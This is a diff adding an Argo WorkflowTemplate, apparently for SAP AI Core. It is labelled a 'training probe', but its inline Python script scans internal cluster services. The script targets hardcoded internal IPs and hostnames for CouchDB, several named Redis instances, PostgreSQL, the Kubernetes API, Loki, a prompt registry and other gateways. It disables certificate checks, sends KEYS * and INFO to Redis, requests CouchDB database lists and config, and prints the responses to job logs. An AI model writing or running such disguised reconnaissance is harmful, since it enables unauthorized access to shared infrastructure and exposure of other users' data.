@@ -1,0 +1,176 @@
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: probe-train-v3
+  labels:
+    scenarios.ai.sap.com/id: "bbprobe-global-1775842304"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "bbprobe-global-1775842304"
+    executables.ai.sap.com/name: "probe-train-v3"
+    executables.ai.sap.com/description: "training probe v3 - db ports, redis, k8s api"
+spec:
+  templates:
+  - name: probe
+    container:
+      image: python:3.11
+      command: ["/bin/sh", "-c"]
+      args:
+      - |
+        python3 - << 'EOF'
+        import socket, ssl, re, json, time, os, struct
+        import urllib.request, urllib.error
+
+        def report(k, v):
+            print(f"[PT3] {k}: {str(v)[:10000]}", flush=True)
+
+        def http_get(url, headers=None, timeout=10):
+            try:
+                req = urllib.request.Request(url, headers=headers or {})
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
+                    return r.read().decode(errors="replace"), r.status, dict(r.headers)
+            except urllib.error.HTTPError as e:
+                body = ""
+                try: body = e.read().decode(errors="replace")[:3000]
+                except: pass
+                return f"HTTP_{e.code}:{body}", e.code, {}
+            except Exception as e:
+                return f"ERR:{type(e).__name__}:{e}", 0, {}
+
+        def tcp_banner(host, port, send=None, timeout=5):
+            """Connect to TCP port and read banner."""
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(timeout)
+                s.connect((host, port))
+                if send:
+                    s.sendall(send)
+                data = b""
+                for _ in range(3):
+                    try:
+                        chunk = s.recv(4096)
+                        if not chunk: break
+                        data += chunk
+                    except: break
+                s.close()
+                return data.decode(errors="replace")
+            except Exception as e:
+                return f"ERR:{type(e).__name__}:{e}"
+
+        report("START", "probe-train-v3")
+
+        # 1. COUCHDB on native port 5984
+        report("---", "=== 1. COUCHDB PORT 5984 ===")
+        couchdb_ip = "100.111.194.97"
+        for port in [5984, 6984, 80, 443]:
+            body, code, hdrs = http_get(f"http://{couchdb_ip}:{port}/", timeout=6)
+            if code and "ERR:timed" not in body and "ERR:Connection" not in body:
+                report(f"COUCHDB_{port}", f"[{code}] {body[:2000]}")
+                if code == 200:
+                    body2, c2, _ = http_get(f"http://{couchdb_ip}:{port}/_all_dbs", timeout=5)
+                    report(f"COUCHDB_DBS", f"[{c2}] {body2[:3000]}")
+                    body3, c3, _ = http_get(f"http://{couchdb_ip}:{port}/_config", timeout=5)
+                    report(f"COUCHDB_CONFIG", f"[{c3}] {body3[:3000]}")
+
+        # Also try DNS
+        for host in ["couchdb-svc-couchdb.couchdb.svc.cluster.local",
+                     "couchdb-couchdb.couchdb.svc.cluster.local",
+                     "couchdb.couchdb.svc.cluster.local"]:
+            body, code, _ = http_get(f"http://{host}:5984/", timeout=5)
+            if code and "ERR:timed" not in body and "ERR:Connection" not in body:
+                report(f"COUCHDB_DNS_{host}", f"[{code}] {body[:1000]}")
+
+        # 2. REDIS instances - try to dump data
+        report("---", "=== 2. REDIS INSTANCES ===")
+        redis_ips = {
+            "llm-access-redis": "100.104.249.35",
+            "rage-proxy-redis": "100.105.134.103",
+            "prompt-registry-redis": "100.110.247.67",
+            "not-diamond-redis": "100.108.223.3",
+        }
+        REDIS_PING = b"*1\r\n$4\r\nPING\r\n"
+        REDIS_INFO = b"*1\r\n$4\r\nINFO\r\n"
+        REDIS_KEYS = b"*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n"
+
+        for name, ip in redis_ips.items():
+            banner = tcp_banner(ip, 6379, send=REDIS_PING, timeout=5)
+            report(f"REDIS_{name}_PING", banner[:500])
+            if "+PONG" in banner or "ERR" in banner:
+                # Try INFO
+                info = tcp_banner(ip, 6379, send=REDIS_INFO, timeout=5)
+                report(f"REDIS_{name}_INFO", info[:2000])
+                # Try KEYS *
+                keys = tcp_banner(ip, 6379, send=REDIS_KEYS, timeout=5)
+                report(f"REDIS_{name}_KEYS", keys[:2000])
+
+        # 3. NOT-DIAMOND POSTGRESQL on 5432
+        report("---", "=== 3. POSTGRESQL (NOT-DIAMOND) ===")
+        pg_ip = "100.106.99.223"
+        # PostgreSQL startup message to get banner
+        # Startup message: length(4) + protocol(4) + "user\0postgres\0database\0postgres\0\0"
+        user_param = b"user\x00postgres\x00database\x00postgres\x00\x00"
+        protocol = b"\x00\x03\x00\x00"  # v3.0
+        msg_len = 4 + 4 + len(user_param)
+        pg_startup = struct.pack(">I", msg_len) + protocol + user_param
+        pg_banner = tcp_banner(pg_ip, 5432, send=pg_startup, timeout=5)
+        report("PG_NOTDIAMOND_BANNER", pg_banner[:1000])
+
+        # 4. KUBERNETES API at internal IP
+        report("---", "=== 4. KUBERNETES API ===")
+        # Try HTTPS on 100.104.0.1:443
+        body, code, hdrs = http_get("https://100.104.0.1:443/api/v1", timeout=8)
+        report("K8S_API_443", f"[{code}] {body[:2000]}")
+        body2, c2, _ = http_get("https://100.104.0.1:443/version", timeout=8)
+        report("K8S_API_VERSION", f"[{c2}] {body2[:500]}")
+        # Try internal hostname
+        body3, c3, _ = http_get("https://kubernetes.default.svc.cluster.local/version", timeout=8)
+        report("K8S_API_DNS_VERSION", f"[{c3}] {body3[:500]}")
+
+        # 5. LOKI - try all common service names in loki namespace
+        report("---", "=== 5. LOKI ALL SERVICE NAMES ===")
+        for svc in ["loki", "loki-gateway", "loki-read", "loki-write",
+                    "loki-querier", "loki-distributor", "loki-ingester",
+                    "loki-query-frontend", "loki-ruler", "loki-compactor",
+                    "loki-backend", "gateway", "read", "write", "backend"]:
+            for port in [80, 3100, 8080]:
+                body, code, _ = http_get(
+                    f"http://{svc}.loki.svc.cluster.local:{port}/ready", timeout=5)
+                if code and "ERR:timed" not in body and "ERR:Connection" not in body:
+                    report(f"LOKI_{svc}:{port}", f"[{code}] {body[:300]}")
+                    if code == 200:
+                        body2, c2, _ = http_get(
+                            f"http://{svc}.loki.svc.cluster.local:{port}/loki/api/v1/labels",
+                            timeout=8)
+                        report(f"LOKI_{svc}_LABELS", f"[{c2}] {body2[:5000]}")
+
+        # 6. ML-API-FACADE - internal AI Core API gateway
+        report("---", "=== 6. ML-API-FACADE ===")
+        for ip, name in [("100.106.71.211", "main"), ("100.106.168.111", "healthz"),
+                         ("100.107.216.157", "gsp"), ("100.107.106.149", "dataset")]:
+            for port in [80, 443, 8080, 9000]:
+                body, code, _ = http_get(f"http://{ip}:{port}/", timeout=5)
+                if code and "ERR:timed" not in body and "ERR:Connection" not in body:
+                    report(f"MLAPIFACADE_{name}_{port}", f"[{code}] {body[:1000]}")
+
+        # 7. PROMPT REGISTRY
+        report("---", "=== 7. PROMPT REGISTRY ===")
+        for ip, name in [("100.107.251.106", "api"), ("100.106.111.110", "k8s-server")]:
+            for port in [80, 443, 8080]:
+                body, code, _ = http_get(f"http://{ip}:{port}/", timeout=5)
+                if code and "ERR:timed" not in body and "ERR:Connection" not in body:
+                    report(f"PROMPT_REG_{name}_{port}", f"[{code}] {body[:1000]}")
+
+        # 8. NOT-DIAMOND SERVER
+        report("---", "=== 8. NOT-DIAMOND OPTIMIZER ===")
+        for ip, name in [("100.107.128.10", "server")]:
+            for port in [80, 443, 8080]:
+                body, code, _ = http_get(f"http://{ip}:{port}/", timeout=5)
+                if code and "ERR:timed" not in body and "ERR:Connection" not in body:
+                    report(f"ND_{name}_{port}", f"[{code}] {body[:1000]}")
+
+        report("DONE", "probe-train-v3 complete")
+        EOF
+  entrypoint: probe
